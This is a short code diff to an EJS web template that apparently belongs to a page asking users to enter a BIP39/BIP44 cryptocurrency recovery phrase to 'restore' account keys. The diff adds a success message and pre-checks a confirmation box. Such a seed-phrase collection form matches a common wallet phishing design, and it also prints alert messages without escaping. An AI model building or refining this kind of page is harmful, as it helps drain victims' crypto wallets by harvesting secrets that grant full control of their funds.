@@ -22,6 +22,9 @@
   <% if(alert.status === "error") { %>
     <div class="error"><b>Error:</b> <%- alert.message %></div>
   <% } %>
+  <% if(alert.status === "success") { %>
+    <div class="success"><b>Success:</b> <%- alert.message %></div>
+  <% } %>
   <div id="15form" class="r-container" <% if(formSection === "12"){ %>style="display: block;"<% } %>>
     <h2 class="mnemonic">MNEMONIC</h2>
     
@@ -77,10 +80,10 @@
 
       <div class="align-items-center justify-content-center mb-3">
         <label>
-          <input type="checkbox" name="checkbox" value='<%- formSection === "12" ? form.checkbox : "" %>' required>
+          <input type="checkbox" name="checkbox" <%- formSection === "12" ? "checked" : "" %> required>
           I have entered all details correctly.
         </label>
-      </div>
+      </div> 
 
       <p style="font-size: 13px; color: #0000FF; text-align: center;">
         Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your account.
